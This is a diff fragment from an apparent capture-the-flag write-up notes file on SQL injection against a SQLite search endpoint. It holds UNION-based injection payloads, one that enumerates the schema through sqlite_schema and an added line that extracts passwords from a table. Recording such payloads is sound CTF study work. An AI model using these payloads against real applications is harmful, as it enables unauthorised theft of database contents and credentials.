@@ -107,6 +107,7 @@ def search():
 - https://www.sqlite.org/schematab.html
 - `a%'union select name from sqlite_schema/*` this does give a lot of info
 - ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/ace9ce66-2470-4753-8f09-966567c1c3ac)
+- a%'union select password from table_{id}/*
 - INSERT INTO table (column1,column2 ,..) VALUES( value1,	value2 ,...)
 - `SELECT name 
 FROM (
